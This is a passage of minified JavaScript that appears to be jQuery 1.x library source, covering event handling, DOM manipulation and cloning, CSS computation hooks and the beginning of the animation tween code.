    return this instanceof e.Event ? (t && t.type ? (this.originalEvent = t, this.type = t.type, this.isDefaultPrevented = t.defaultPrevented || void 0 === t.defaultPrevented && t.returnValue === !1 ? O : k) : this.type = t, n && e.extend(this, n), this.timeStamp = t && t.timeStamp || e.now(), void (this[e.expando] = !0)) : new e.Event(t, n);
  }, e.Event.prototype = {
    isDefaultPrevented: k,
    isPropagationStopped: k,
    isImmediatePropagationStopped: k,
    preventDefault: function () {
      var e = this.originalEvent;
      this.isDefaultPrevented = O, e && (e.preventDefault ? e.preventDefault() : e.returnValue = !1);
    },
    stopPropagation: function () {
      var e = this.originalEvent;
      this.isPropagationStopped = O, e && (e.stopPropagation && e.stopPropagation(), e.cancelBubble = !0);
    },
    stopImmediatePropagation: function () {
      var e = this.originalEvent;
      this.isImmediatePropagationStopped = O, e && e.stopImmediatePropagation && e.stopImmediatePropagation(), this.stopPropagation();
    }
  }, e.each({
    mouseenter: "mouseover",
    mouseleave: "mouseout",
    pointerenter: "pointerover",
    pointerleave: "pointerout"
  }, function (t, n) {
    e.event.special[t] = {
      delegateType: n,
      bindType: n,
      handle: function (t) {
        var i,
          o = this,
          r = t.relatedTarget,
          a = t.handleObj;
        return (!r || r !== o && !e.contains(o, r)) && (t.type = a.origType, i = a.handler.apply(this, arguments), t.type = n), i;
      }
    };
  }), r.submitBubbles || (e.event.special.submit = {
    setup: function () {
      return e.nodeName(this, "form") ? !1 : void e.event.add(this, "click._submit keypress._submit", function (t) {
        var r = t.target,
          n = e.nodeName(r, "input") || e.nodeName(r, "button") ? r.form : void 0;
        n && !e.e$(n, "submitBubbles") && (e.event.add(n, "submit._submit", function (e) {
          e.i$ = !0;
        }), e.e$(n, "submitBubbles", !0));
      });
    },
    postDispatch: function (t) {
      t.i$ && (delete t.i$, this.parentNode && !t.isTrigger && e.event.simulate("submit", this.parentNode, t, !0));
    },
    teardown: function () {
      return e.nodeName(this, "form") ? !1 : void e.event.remove(this, "._submit");
    }
  }), r.changeBubbles || (e.event.special.change = {
    setup: function () {
      return ee.test(this.nodeName) ? (("checkbox" === this.type || "radio" === this.type) && (e.event.add(this, "propertychange._change", function (e) {
        "checked" === e.originalEvent.propertyName && (this.o$ = !0);
      }), e.event.add(this, "click._change", function (t) {
        this.o$ && !t.isTrigger && (this.o$ = !1), e.event.simulate("change", this, t, !0);
      })), !1) : void e.event.add(this, "beforeactivate._change", function (t) {
        var n = t.target;
        ee.test(n.nodeName) && !e.e$(n, "changeBubbles") && (e.event.add(n, "change._change", function (t) {
          !this.parentNode || t.isSimulated || t.isTrigger || e.event.simulate("change", this.parentNode, t, !0);
        }), e.e$(n, "changeBubbles", !0));
      });
    },
    handle: function (e) {
      var t = e.target;
      return this !== t || e.isSimulated || e.isTrigger || "radio" !== t.type && "checkbox" !== t.type ? e.handleObj.handler.apply(this, arguments) : void 0;
    },
    teardown: function () {
      return e.event.remove(this, "._change"), !ee.test(this.nodeName);
    }
  }), r.focusinBubbles || e.each({
    focus: "focusin",
    blur: "focusout"
  }, function (t, n) {
    var r = function (t) {
      e.event.simulate(n, t.target, e.event.fix(t), !0);
    };
    e.event.special[n] = {
      setup: function () {
        var i = this.ownerDocument || this,
          o = e.e$(i, n);
        o || i.addEventListener(t, r, !0), e.e$(i, n, (o || 0) + 1);
      },
      teardown: function () {
        var i = this.ownerDocument || this,
          o = e.e$(i, n) - 1;
        o ? e.e$(i, n, o) : (i.removeEventListener(t, r, !0), e.n$(i, n));
      }
    };
  }), e.fn.extend({
    on: function (t, n, r, i, o) {
      var s, a;
      if ("object" == typeof t) {
        "string" != typeof n && (r = r || n, n = void 0);
        for (s in t) this.on(s, n, r, t[s], o);
        return this;
      }
      ;
      if (null == r && null == i ? (i = n, r = n = void 0) : null == i && ("string" == typeof n ? (i = r, r = void 0) : (i = r, r = n, n = void 0)), i === !1) i = k;else if (!i) return this;
      return 1 === o && (a = i, i = function (t) {
        return e().off(t), a.apply(this, arguments);
      }, i.guid = a.guid || (a.guid = e.guid++)), this.each(function () {
        e.event.add(this, t, i, r, n);
      });
    },
    one: function (e, t, n, r) {
      return this.on(e, t, n, r, 1);
    },
    off: function (t, n, r) {
      var i, o;
      if (t && t.preventDefault && t.handleObj) return i = t.handleObj, e(t.delegateTarget).off(i.namespace ? i.origType + "." + i.namespace : i.origType, i.selector, i.handler), this;
      if ("object" == typeof t) {
        for (o in t) this.off(o, n, t[o]);
        return this;
      }
      ;
      return (n === !1 || "function" == typeof n) && (r = n, n = void 0), r === !1 && (r = k), this.each(function () {
        e.event.remove(this, t, r, n);
      });
    },
    trigger: function (t, n) {
      return this.each(function () {
        e.event.trigger(t, n, this);
      });
    },
    triggerHandler: function (t, n) {
      var r = this[0];
      return r ? e.event.trigger(t, n, r, !0) : void 0;
    }
  });
  function ke(e) {
    var n = Ke.split("|"),
      t = e.createDocumentFragment();
    if (t.createElement) while (n.length) t.createElement(n.pop());
    return t;
  }
  ;
  var Ke = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
    Dt = / jQuery\d+="(?:null|\d+)"/g,
    Ge = new RegExp("<(?:" + Ke + ")[\\s/>]", "i"),
    U = /^\s+/,
    Fe = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
    Ze = /<([\w:]+)/,
    et = /<tbody/i,
    jt = /<|&#?\w+;/,
    At = /<(?:script|style|link)/i,
    St = /checked\s*(?:[^=]|=\s*.checked.)/i,
    st = /^$|\/(?:java|ecma)script/i,
    kt = /^true\/(.*)/,
    Et = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
    l = {
      option: [1, "<select multiple='multiple'>", "</select>"],
      legend: [1, "<fieldset>", "</fieldset>"],
      area: [1, "<map>", "</map>"],
      param: [1, "<object>", "</object>"],
      thead: [1, "<table>", "</table>"],
      tr: [2, "<table><tbody>", "</tbody></table>"],
      col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
      td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
      t$: r.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
    },
    It = ke(i),
    K = It.appendChild(i.createElement("div"));
  l.optgroup = l.option, l.tbody = l.tfoot = l.colgroup = l.caption = l.thead, l.th = l.td;
  function a(t, n) {
    var o,
      i,
      s = 0,
      r = typeof t.getElementsByTagName !== u ? t.getElementsByTagName(n || "*") : typeof t.querySelectorAll !== u ? t.querySelectorAll(n || "*") : void 0;
    if (!r) for (r = [], o = t.childNodes || t; null != (i = o[s]); s++) !n || e.nodeName(i, n) ? r.push(i) : e.merge(r, a(i, n));
    return void 0 === n || n && e.nodeName(t, n) ? e.merge([t], r) : r;
  }
  ;
  function dt(e) {
    se.test(e.type) && (e.defaultChecked = e.checked);
  }
  ;
  function Te(t, n) {
    return e.nodeName(t, "table") && e.nodeName(11 !== n.nodeType ? n : n.firstChild, "tr") ? t.getElementsByTagName("tbody")[0] || t.appendChild(t.ownerDocument.createElement("tbody")) : t;
  }
  ;
  function qe(t) {
    return t.type = (null !== e.find.attr(t, "type")) + "/" + t.type, t;
  }
  ;
  function we(e) {
    var t = kt.exec(e.type);
    return t ? e.type = t[1] : e.removeAttribute("type"), e;
  }
  ;
  function Z(t, n) {
    for (var i, r = 0; null != (i = t[r]); r++) e.e$(i, "globalEval", !n || e.e$(n[r], "globalEval"));
  }
  ;
  function ye(t, n) {
    if (1 === n.nodeType && e.hasData(t)) {
      var i,
        o,
        s,
        l = e.e$(t),
        r = e.e$(n, l),
        a = l.events;
      if (a) {
        delete r.handle, r.events = {};
        for (i in a) for (o = 0, s = a[i].length; s > o; o++) e.event.add(n, i, a[i][o]);
      }
      ;
      r.data && (r.data = e.extend({}, r.data));
    }
  }
  ;
  function ht(t, n) {
    var i, a, o;
    if (1 === n.nodeType) {
      if (i = n.nodeName.toLowerCase(), !r.noCloneEvent && n[e.expando]) {
        o = e.e$(n);
        for (a in o.events) e.removeEvent(n, a, o.handle);
        n.removeAttribute(e.expando);
      }
      ;
      "script" === i && n.text !== t.text ? (qe(n).text = t.text, we(n)) : "object" === i ? (n.parentNode && (n.outerHTML = t.outerHTML), r.html5Clone && t.innerHTML && !e.trim(n.innerHTML) && (n.innerHTML = t.innerHTML)) : "input" === i && se.test(t.type) ? (n.defaultChecked = n.checked = t.checked, n.value !== t.value && (n.value = t.value)) : "option" === i ? n.defaultSelected = n.selected = t.defaultSelected : ("input" === i || "textarea" === i) && (n.defaultValue = t.defaultValue);
    }
  }
  ;
  e.extend({
    clone: function (t, n, i) {
      var o,
        c,
        l,
        s,
        u,
        d = e.contains(t.ownerDocument, t);
      if (r.html5Clone || e.isXMLDoc(t) || !Ge.test("<" + t.nodeName + ">") ? l = t.cloneNode(!0) : (K.innerHTML = t.outerHTML, K.removeChild(l = K.firstChild)), !(r.noCloneEvent && r.noCloneChecked || 1 !== t.nodeType && 11 !== t.nodeType || e.isXMLDoc(t))) for (o = a(l), u = a(t), s = 0; null != (c = u[s]); ++s) o[s] && ht(c, o[s]);
      if (n) if (i) for (u = u || a(t), o = o || a(l), s = 0; null != (c = u[s]); s++) ye(c, o[s]);else ye(t, l);
      return o = a(l, "script"), o.length > 0 && Z(o, !d && a(t, "script")), o = u = c = null, l;
    },
    buildFragment: function (t, n, i, o) {
      for (var c, s, v, u, m, g, f, y = t.length, p = ke(n), d = [], h = 0; y > h; h++) if (s = t[h], s || 0 === s) if ("object" === e.type(s)) e.merge(d, s.nodeType ? [s] : s);else if (jt.test(s)) {
        u = u || p.appendChild(n.createElement("div")), m = (Ze.exec(s) || ["", ""])[1].toLowerCase(), f = l[m] || l.t$, u.innerHTML = f[1] + s.replace(Fe, "<$1></$2>") + f[2], c = f[0];
        while (c--) u = u.lastChild;
        if (!r.leadingWhitespace && U.test(s) && d.push(n.createTextNode(U.exec(s)[0])), !r.tbody) {
          s = "table" !== m || et.test(s) ? "<table>" !== f[1] || et.test(s) ? 0 : u : u.firstChild, c = s && s.childNodes.length;
          while (c--) e.nodeName(g = s.childNodes[c], "tbody") && !g.childNodes.length && s.removeChild(g);
        }
        ;
        e.merge(d, u.childNodes), u.textContent = "";
        while (u.firstChild) u.removeChild(u.firstChild);
        u = p.lastChild;
      } else d.push(n.createTextNode(s));
      u && p.removeChild(u), r.appendChecked || e.grep(a(d, "input"), dt), h = 0;
      while (s = d[h++]) if ((!o || -1 === e.inArray(s, o)) && (v = e.contains(s.ownerDocument, s), u = a(p.appendChild(s), "script"), v && Z(u), i)) {
        c = 0;
        while (s = u[c++]) st.test(s.type || "") && i.push(s);
      }
      ;
      return u = null, p;
    },
    cleanData: function (t, n) {
      for (var i, a, o, s, d = 0, l = e.expando, c = e.cache, f = r.deleteExpando, h = e.event.special; null != (i = t[d]); d++) if ((n || e.acceptData(i)) && (o = i[l], s = o && c[o])) {
        if (s.events) for (a in s.events) h[a] ? e.event.remove(i, a) : e.removeEvent(i, a, s.handle);
        c[o] && (delete c[o], f ? delete i[l] : typeof i.removeAttribute !== u ? i.removeAttribute(l) : i[l] = null, p.push(o));
      }
    }
  }), e.fn.extend({
    text: function (t) {
      return y(this, function (t) {
        return void 0 === t ? e.text(this) : this.empty().append((this[0] && this[0].ownerDocument || i).createTextNode(t));
      }, null, t, arguments.length);
    },
    append: function () {
      return this.domManip(arguments, function (e) {
        if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
          var t = Te(this, e);
          t.appendChild(e);
        }
      });
    },
    prepend: function () {
      return this.domManip(arguments, function (e) {
        if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
          var t = Te(this, e);
          t.insertBefore(e, t.firstChild);
        }
      });
    },
    before: function () {
      return this.domManip(arguments, function (e) {
        this.parentNode && this.parentNode.insertBefore(e, this);
      });
    },
    after: function () {
      return this.domManip(arguments, function (e) {
        this.parentNode && this.parentNode.insertBefore(e, this.nextSibling);
      });
    },
    remove: function (t, n) {
      for (var r, o = t ? e.filter(t, this) : this, i = 0; null != (r = o[i]); i++) n || 1 !== r.nodeType || e.cleanData(a(r)), r.parentNode && (n && e.contains(r.ownerDocument, r) && Z(a(r, "script")), r.parentNode.removeChild(r));
      return this;
    },
    empty: function () {
      for (var t, n = 0; null != (t = this[n]); n++) {
        1 === t.nodeType && e.cleanData(a(t, !1));
        while (t.firstChild) t.removeChild(t.firstChild);
        t.options && e.nodeName(t, "select") && (t.options.length = 0);
      }
      ;
      return this;
    },
    clone: function (t, n) {
      return t = null == t ? !1 : t, n = null == n ? t : n, this.map(function () {
        return e.clone(this, t, n);
      });
    },
    html: function (t) {
      return y(this, function (t) {
        var i = this[0] || {},
          o = 0,
          s = this.length;
        if (void 0 === t) return 1 === i.nodeType ? i.innerHTML.replace(Dt, "") : void 0;
        if (!("string" != typeof t || At.test(t) || !r.htmlSerialize && Ge.test(t) || !r.leadingWhitespace && U.test(t) || l[(Ze.exec(t) || ["", ""])[1].toLowerCase()])) {
          t = t.replace(Fe, "<$1></$2>");
          try {
            for (; s > o; o++) i = this[o] || {}, 1 === i.nodeType && (e.cleanData(a(i, !1)), i.innerHTML = t);
            i = 0;
          } catch (n) {}
        }
        ;
        i && this.empty().append(t);
      }, null, t, arguments.length);
    },
    replaceWith: function () {
      var t = arguments[0];
      return this.domManip(arguments, function (n) {
        t = this.parentNode, e.cleanData(a(this)), t && t.replaceChild(n, this);
      }), t && (t.length || t.nodeType) ? this : this.remove();
    },
    detach: function (e) {
      return this.remove(e, !0);
    },
    domManip: function (t, n) {
      t = Ce.apply([], t);
      var u,
        i,
        c,
        s,
        p,
        l,
        o = 0,
        d = this.length,
        m = this,
        g = d - 1,
        f = t[0],
        h = e.isFunction(f);
      if (h || d > 1 && "string" == typeof f && !r.checkClone && St.test(f)) return this.each(function (e) {
        var r = m.eq(e);
        h && (t[0] = f.call(this, e, r.html())), r.domManip(t, n);
      });
      if (d && (l = e.buildFragment(t, this[0].ownerDocument, !1, this), u = l.firstChild, 1 === l.childNodes.length && (l = u), u)) {
        for (s = e.map(a(l, "script"), qe), c = s.length; d > o; o++) i = l, o !== g && (i = e.clone(i, !0, !0), c && e.merge(s, a(i, "script"))), n.call(this[o], i, o);
        if (c) for (p = s[s.length - 1].ownerDocument, e.map(s, we), o = 0; c > o; o++) i = s[o], st.test(i.type || "") && !e.e$(i, "globalEval") && e.contains(p, i) && (i.src ? e.a$ && e.a$(i.src) : e.globalEval((i.text || i.textContent || i.innerHTML || "").replace(Et, "")));
        l = u = null;
      }
      ;
      return this;
    }
  }), e.each({
    appendTo: "append",
    prependTo: "prepend",
    insertBefore: "before",
    insertAfter: "after",
    replaceAll: "replaceWith"
  }, function (t, n) {
    e.fn[t] = function (t) {
      for (var i, r = 0, o = [], a = e(t), s = a.length - 1; s >= r; r++) i = r === s ? this : this.clone(!0), e(a[r])[n](i), J.apply(o, i.get());
      return this.pushStack(o);
    };
  });
  var A,
    Je = {};
  function me(n, r) {
    var o,
      i = e(r.createElement(n)).appendTo(r.body),
      a = t.getDefaultComputedStyle && (o = t.getDefaultComputedStyle(i[0])) ? o.display : e.css(i[0], "display");
    return i.detach(), a;
  }
  ;
  function F(t) {
    var r = i,
      n = Je[t];
    return n || (n = me(t, r), "none" !== n && n || (A = (A || e("<iframe frameborder='0' width='0' height='0'/>")).appendTo(r.documentElement), r = (A[0].contentWindow || A[0].contentDocument).document, r.write(), r.close(), n = me(t, r), A.detach()), Je[t] = n), n;
  }
  ;
  !function () {
    var e;
    r.shrinkWrapBlocks = function () {
      if (null != e) return e;
      e = !1;
      var t, n, r;
      return n = i.getElementsByTagName("body")[0], n && n.style ? (t = i.createElement("div"), r = i.createElement("div"), r.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", n.appendChild(r).appendChild(t), typeof t.style.zoom !== u && (t.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1", t.appendChild(i.createElement("div")).style.width = "5px", e = 3 !== t.offsetWidth), n.removeChild(r), e) : void 0;
    };
  }();
  var Xe = /^margin/,
    M = new RegExp("^(" + W + ")(?!px)[a-z%]+$", "i"),
    g,
    v,
    Nt = /^(top|right|bottom|left)$/;
  t.getComputedStyle ? (g = function (e) {
    return e.ownerDocument.defaultView.getComputedStyle(e, null);
  }, v = function (t, n, r) {
    var a,
      s,
      l,
      i,
      o = t.style;
    return r = r || g(t), i = r ? r.getPropertyValue(n) || r[n] : void 0, r && ("" !== i || e.contains(t.ownerDocument, t) || (i = e.style(t, n)), M.test(i) && Xe.test(n) && (a = o.width, s = o.minWidth, l = o.maxWidth, o.minWidth = o.maxWidth = o.width = i, i = r.width, o.width = a, o.minWidth = s, o.maxWidth = l)), void 0 === i ? i : i + "";
  }) : i.documentElement.currentStyle && (g = function (e) {
    return e.currentStyle;
  }, v = function (e, t, n) {
    var s,
      o,
      a,
      r,
      i = e.style;
    return n = n || g(e), r = n ? n[t] : void 0, null == r && i && i[t] && (r = i[t]), M.test(r) && !Nt.test(t) && (s = i.left, o = e.runtimeStyle, a = o && o.left, a && (o.left = e.currentStyle.left), i.left = "fontSize" === t ? "1em" : r, r = i.pixelLeft + "px", i.left = s, a && (o.left = a)), void 0 === r ? r : r + "" || "auto";
  });
  function ce(e, t) {
    return {
      get: function () {
        var n = e();
        if (null != n) return n ? void delete this.get : (this.get = t).apply(this, arguments);
      }
    };
  }
  ;
  !function () {
    var o, n, d, s, l, a, u;
    if (o = i.createElement("div"), o.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", d = o.getElementsByTagName("a")[0], n = d && d.style) {
      n.cssText = "float:left;opacity:.5", r.opacity = "0.5" === n.opacity, r.cssFloat = !!n.cssFloat, o.style.backgroundClip = "content-box", o.cloneNode(!0).style.backgroundClip = "", r.clearCloneStyle = "content-box" === o.style.backgroundClip, r.boxSizing = "" === n.boxSizing || "" === n.MozBoxSizing || "" === n.WebkitBoxSizing, e.extend(r, {
        reliableHiddenOffsets: function () {
          return null == a && c(), a;
        },
        boxSizingReliable: function () {
          return null == l && c(), l;
        },
        pixelPosition: function () {
          return null == s && c(), s;
        },
        reliableMarginRight: function () {
          return null == u && c(), u;
        }
      });
      function c() {
        var n, r, o, e;
        r = i.getElementsByTagName("body")[0], r && r.style && (n = i.createElement("div"), o = i.createElement("div"), o.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", r.appendChild(o).appendChild(n), n.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute", s = l = !1, u = !0, t.getComputedStyle && (s = "1%" !== (t.getComputedStyle(n, null) || {}).top, l = "4px" === (t.getComputedStyle(n, null) || {
          width: "4px"
        }).width, e = n.appendChild(i.createElement("div")), e.style.cssText = n.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0", e.style.marginRight = e.style.width = "0", n.style.width = "1px", u = !parseFloat((t.getComputedStyle(e, null) || {}).marginRight)), n.innerHTML = "<table><tr><td></td><td>t</td></tr></table>", e = n.getElementsByTagName("td"), e[0].style.cssText = "margin:0;border:0;padding:0;display:none", a = 0 === e[0].offsetHeight, a && (e[0].style.display = "", e[1].style.display = "none", a = 0 === e[0].offsetHeight), r.removeChild(o));
      }
    }
  }(), e.swap = function (e, t, n, r) {
    var o,
      i,
      a = {};
    for (i in t) a[i] = e.style[i], e.style[i] = t[i];
    o = n.apply(e, r || []);
    for (i in t) e.style[i] = a[i];
    return o;
  };
  var re = /alpha\([^)]*\)/i,
    Rt = /opacity\s*=\s*([^)]*)/,
    Pt = /^(none|table(?!-c[ea]).+)/,
    Bt = new RegExp("^(" + W + ")(.*)$", "i"),
    Ft = new RegExp("^([+-])=(" + W + ")", "i"),
    Ot = {
      position: "absolute",
      visibility: "hidden",
      display: "block"
    },
    ze = {
      letterSpacing: "0",
      fontWeight: "400"
    },
    Ie = ["Webkit", "O", "Moz", "ms"];
  function fe(e, t) {
    if (t in e) return t;
    var r = t.charAt(0).toUpperCase() + t.slice(1),
      i = t,
      n = Ie.length;
    while (n--) if (t = Ie[n] + r, t in e) return t;
    return i;
  }
  ;
  function rt(t, n) {
    for (var o, r, s, a = [], i = 0, l = t.length; l > i; i++) r = t[i], r.style && (a[i] = e.e$(r, "olddisplay"), o = r.style.display, n ? (a[i] || "none" !== o || (r.style.display = ""), "" === r.style.display && D(r) && (a[i] = e.e$(r, "olddisplay", F(r.nodeName)))) : (s = D(r), (o && "none" !== o || !s) && e.e$(r, "olddisplay", s ? o : e.css(r, "display"))));
    for (i = 0; l > i; i++) r = t[i], r.style && (n && "none" !== r.style.display && "" !== r.style.display || (r.style.display = n ? a[i] || "" : "none"));
    return t;
  }
  ;
  function it(e, t, n) {
    var r = Bt.exec(t);
    return r ? Math.max(0, r[1] - (n || 0)) + (r[2] || "px") : t;
  }
  ;
  function ot(t, n, r, i, o) {
    for (var a = r === (i ? "border" : "content") ? 4 : "width" === n ? 1 : 0, s = 0; 4 > a; a += 2) "margin" === r && (s += e.css(t, r + w[a], !0, o)), i ? ("content" === r && (s -= e.css(t, "padding" + w[a], !0, o)), "margin" !== r && (s -= e.css(t, "border" + w[a] + "Width", !0, o))) : (s += e.css(t, "padding" + w[a], !0, o), "padding" !== r && (s += e.css(t, "border" + w[a] + "Width", !0, o)));
    return s;
  }
  ;
  function at(t, n, i) {
    var s = !0,
      o = "width" === n ? t.offsetWidth : t.offsetHeight,
      a = g(t),
      l = r.boxSizing && "border-box" === e.css(t, "boxSizing", !1, a);
    if (0 >= o || null == o) {
      if (o = v(t, n, a), (0 > o || null == o) && (o = t.style[n]), M.test(o)) return o;
      s = l && (r.boxSizingReliable() || o === t.style[n]), o = parseFloat(o) || 0;
    }
    ;
    return o + ot(t, n, i || (l ? "border" : "content"), s, a) + "px";
  }
  ;
  e.extend({
    cssHooks: {
      opacity: {
        get: function (e, t) {
          if (t) {
            var n = v(e, "opacity");
            return "" === n ? "1" : n;
          }
        }
      }
    },
    cssNumber: {
      columnCount: !0,
      fillOpacity: !0,
      flexGrow: !0,
      flexShrink: !0,
      fontWeight: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0
    },
    cssProps: {
      "float": r.cssFloat ? "cssFloat" : "styleFloat"
    },
    style: function (t, n, i, o) {
      if (t && 3 !== t.nodeType && 8 !== t.nodeType && t.style) {
        var l,
          c,
          s,
          u = e.camelCase(n),
          d = t.style;
        if (n = e.cssProps[u] || (e.cssProps[u] = fe(d, u)), s = e.cssHooks[n] || e.cssHooks[u], void 0 === i) return s && "get" in s && void 0 !== (l = s.get(t, !1, o)) ? l : d[n];
        if (c = typeof i, "string" === c && (l = Ft.exec(i)) && (i = (l[1] + 1) * l[2] + parseFloat(e.css(t, n)), c = "number"), null != i && i === i && ("number" !== c || e.cssNumber[u] || (i += "px"), r.clearCloneStyle || "" !== i || 0 !== n.indexOf("background") || (d[n] = "inherit"), !(s && "set" in s && void 0 === (i = s.set(t, i, o))))) try {
          d[n] = i;
        } catch (a) {}
      }
    },
    css: function (t, n, r, i) {
      var l,
        o,
        a,
        s = e.camelCase(n);
      return n = e.cssProps[s] || (e.cssProps[s] = fe(t.style, s)), a = e.cssHooks[n] || e.cssHooks[s], a && "get" in a && (o = a.get(t, !0, r)), void 0 === o && (o = v(t, n, i)), "normal" === o && n in ze && (o = ze[n]), "" === r || r ? (l = parseFloat(o), r === !0 || e.isNumeric(l) ? l || 0 : o) : o;
    }
  }), e.each(["height", "width"], function (t, n) {
    e.cssHooks[n] = {
      get: function (t, r, i) {
        return r ? Pt.test(e.css(t, "display")) && 0 === t.offsetWidth ? e.swap(t, Ot, function () {
          return at(t, n, i);
        }) : at(t, n, i) : void 0;
      },
      set: function (t, i, o) {
        var a = o && g(t);
        return it(t, i, o ? ot(t, n, o, r.boxSizing && "border-box" === e.css(t, "boxSizing", !1, a), a) : 0);
      }
    };
  }), r.opacity || (e.cssHooks.opacity = {
    get: function (e, t) {
      return Rt.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : "";
    },
    set: function (t, n) {
      var r = t.style,
        i = t.currentStyle,
        a = e.isNumeric(n) ? "alpha(opacity=" + 100 * n + ")" : "",
        o = i && i.filter || r.filter || "";
      r.zoom = 1, (n >= 1 || "" === n) && "" === e.trim(o.replace(re, "")) && r.removeAttribute && (r.removeAttribute("filter"), "" === n || i && !i.filter) || (r.filter = re.test(o) ? o.replace(re, a) : o + " " + a);
    }
  }), e.cssHooks.marginRight = ce(r.reliableMarginRight, function (t, n) {
    return n ? e.swap(t, {
      display: "inline-block"
    }, v, [t, "marginRight"]) : void 0;
  }), e.each({
    margin: "",
    padding: "",
    border: "Width"
  }, function (t, n) {
    e.cssHooks[t + n] = {
      expand: function (e) {
        for (var r = 0, o = {}, i = "string" == typeof e ? e.split(" ") : [e]; 4 > r; r++) o[t + w[r] + n] = i[r] || i[r - 2] || i[0];
        return o;
      }
    }, Xe.test(t) || (e.cssHooks[t + n].set = it);
  }), e.fn.extend({
    css: function (t, n) {
      return y(this, function (t, n, r) {
        var o,
          a,
          s = {},
          i = 0;
        if (e.isArray(n)) {
          for (o = g(t), a = n.length; a > i; i++) s[n[i]] = e.css(t, n[i], !1, o);
          return s;
        }
        ;
        return void 0 !== r ? e.style(t, n, r) : e.css(t, n);
      }, t, n, arguments.length > 1);
    },
    show: function () {
      return rt(this, !0);
    },
    hide: function () {
      return rt(this);
    },
    toggle: function (t) {
      return "boolean" == typeof t ? t ? this.show() : this.hide() : this.each(function () {
        D(this) ? e(this).show() : e(this).hide();
      });
    }
  });
  function s(e, t, n, r, i) {
    return new s.prototype.init(e, t, n, r, i);
  }
  ;
  e.Tween = s, s.prototype = {
    constructor: s,
    init: function (t, n, r, i, o, a) {
      this.elem = t, this.prop = r, this.easing = o || "swing", this.options = n, this.start = this.now = this.cur(), this.end = i, this.unit = a || (e.cssNumber[r] ? "" : "px");
    },
    cur: function () {
      var e = s.propHooks[this.prop];
      return e && e.get ? e.get(this) : s.propHooks.t$.get(this);
    },
    run: function (t) {
      var r,
        n = s.propHooks[this.prop];
      return this.pos = r = this.options.duration ? e.easing[this.easing](t, this.options.duration * t, 0, 1, this.options.duration) : t, this.now = (this.end - this.start) * r + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : s.propHooks.t$.set(this), this;
    }
  }, s.prototype.init.prototype = s.prototype, s.propHooks = {
    t$: {
      get: function (t) {
        var n;
        return null == t.elem[t.prop] || t.elem.style && null != t.elem.style[t.prop] ? (n = e.css(t.elem, t.prop, ""), n && "auto" !== n ? n : 0) : t.elem[t.prop];
      },
      set: function (t) {
        e.fx.step[t.prop] ? e.fx.step[t.prop](t) : t.elem.style && (null != t.elem.style[e.cssProps[t.prop]] || e.cssHooks[t.prop]) ? e.style(t.elem, t.prop, t.now + t.unit) : t.elem[t.prop] = t.now;
      }
    }
  }, s.propHooks.scrollTop = s.propHooks.scrollLeft = {
    set: function (e) {
      e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now);
    }
  }, e.easing = {
    linear: function (e) {
      return e;
    },
    swing: function (e) {
      return .5 - Math.cos(e * Math.PI) / 2;
    }
  }, e.fx = s.prototype.init, e.fx.step = {};
  var E,
    R,
    zt = /^(?:toggle|show|hide)$/,
    Pe = new RegExp("^(?:([+-])=|)(" + W + ")([a-z%]*)$", "i"),
    Wt = /queueHooks$/,
    B = [wt],
    S = {
      "*": [function (t, n) {
        var o = this.createTween(t, n),
          l = o.cur(),
          r = Pe.exec(n),
          a = r && r[3] || (e.cssNumber[t] ? "" : "px"),
          i = (e.cssNumber[t] || "px" !== a && +l) && Pe.exec(e.css(o.elem, t)),
          s = 1,
          u = 20;
        if (i && i[3] !== a) {
          a = a || i[3], r = r || [], i = +l || 1;
          do s = s || ".5", i /= s, e.style(o.elem, t, i + a); while (s !== (s = o.cur() / l) && 1 !== s && --u);
        }
        ;
        return r && (i = o.start = +i || +l || 0, o.unit = a, o.end = r[1] ? i + (r[1] + 1) * r[2] : +r[2]), o;
      }]
    };
  function lt() {
    return setTimeout(function () {
      E = void 0;
    }), E = e.now();
  }
  ;
  function P(e, t) {
    var r,
      n = {
        height: e
      },
      i = 0;
    for (t = t ? 1 : 0; 4 > i; i += 2 - t) r = w[i], n["margin" + r] = n["padding" + r] = e;
    return t && (n.opacity = n.width = e), n;
  }
  ;
  function ut(e, t, n) {
    for (var i, o = (S[t] || []).concat(S["*"]), r = 0, a = o.length; a > r; r++) if (i = o[r].call(n, t, e)) return i;
  }
  ;
  function wt(t, n, i) {
    var o,
      f,
      m,
      p,
      l,
      g,
      u,
      v,
      d = this,
      h = {},
      s = t.style,
      c = t.nodeType && D(t),
      a = e.e$(t, "fxshow");
    i.queue || (l = e.r$(t, "fx"), null == l.unqueued && (l.unqueued = 0, g = l.empty.fire, l.empty.fire = function () {
      l.unqueued || g();
    }), l.unqueued++, d.always(function () {
      d.always(function () {
        l.unqueued--, e.queue(t, "fx").length || l.empty.fire();
      });
